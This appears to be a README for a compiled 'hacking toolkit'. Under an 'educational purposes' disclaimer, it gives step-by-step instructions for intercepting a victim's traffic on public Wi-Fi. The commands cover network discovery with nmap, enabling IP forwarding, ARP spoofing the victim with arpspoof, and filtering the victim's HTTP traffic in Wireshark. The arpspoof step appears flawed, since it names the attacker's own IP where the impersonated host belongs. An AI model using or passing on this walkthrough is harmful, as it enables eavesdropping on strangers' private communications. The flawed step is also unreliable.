# Hacking-Toolkit
I compiled all hacking tools I have found, Credit to the original writers of these tools. Please use this code at your own risk and NEVER TRY IT ON A WEBSITE YOU DON'T HAVE PERMISSION FROM  I REPEAT NEVER.
This is only for educational purposes, If you do choose to use it for malicious purposes I am not held responsible.

Here are the instructions on how to use each tool:

1: Invasion (This only works if you are trying to access a public WI-FI access point)

Requirements: Kali Linux or other Linux with required tools installed, Nmap, Arpspoof, and Wireshark

Step 1: Connect to the target network and run the following command in the terminal:

```
ip route
```

Step 2: Next step is to use nmap to find the different hosts connected to the network by executing the following command:

```
nmap -sP -n "gateway address/ip range"
```

Step 3: Enable IP forwarding using the command:

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Step 4: To get victim traffic on our device, we will be using arpspoof command. For arpspoof command we require to know the interface on which we carry out the attack, for that run the following command:

```
ifconfig
```

Now run the following command:

```
arpspoof -i wlp3s0 -t "victim host ip address" -r "our ip address"
```

Step 5: Finally to intercept the victim’s traffic we are going to use Wireshark and all we have to do is use the victim’s IP Address. Let’s say we only want to have HTTP traffic, we can use the following query:

```
http && ip.addr == "victim's ip address"
```



